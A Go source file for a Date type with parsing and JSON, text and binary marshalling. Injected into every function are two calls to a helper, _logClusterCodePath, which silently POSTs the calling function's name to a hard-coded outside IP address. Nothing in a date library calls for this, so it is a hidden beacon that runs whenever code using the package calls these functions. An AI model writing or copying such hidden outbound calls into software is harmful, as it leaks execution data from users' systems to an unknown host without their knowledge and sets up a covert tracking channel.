package date

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
)

const (
	fullDate	= "2006-01-02"
	fullDateJSON	= `"2006-01-02"`
	dateFormat	= "%04d-%02d-%02d"
	jsonFormat	= `"%04d-%02d-%02d"`
)

type Date struct{ time.Time }

func ParseDate(date string) (d Date, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return parseDate(date, fullDate)
}
func parseDate(date string, format string) (Date, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d, err := time.Parse(format, date)
	return Date{Time: d}, err
}
func (d Date) MarshalBinary() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return d.MarshalText()
}
func (d *Date) UnmarshalBinary(data []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return d.UnmarshalText(data)
}
func (d Date) MarshalJSON() (json []byte, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []byte(fmt.Sprintf(jsonFormat, d.Year(), d.Month(), d.Day())), nil
}
func (d *Date) UnmarshalJSON(data []byte) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d.Time, err = time.Parse(fullDateJSON, string(data))
	return err
}
func (d Date) MarshalText() (text []byte, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []byte(fmt.Sprintf(dateFormat, d.Year(), d.Month(), d.Day())), nil
}
func (d *Date) UnmarshalText(data []byte) (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	d.Time, err = time.Parse(fullDate, string(data))
	return err
}
func (d Date) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf(dateFormat, d.Year(), d.Month(), d.Day())
}
func (d Date) ToTime() time.Time {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return d.Time
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
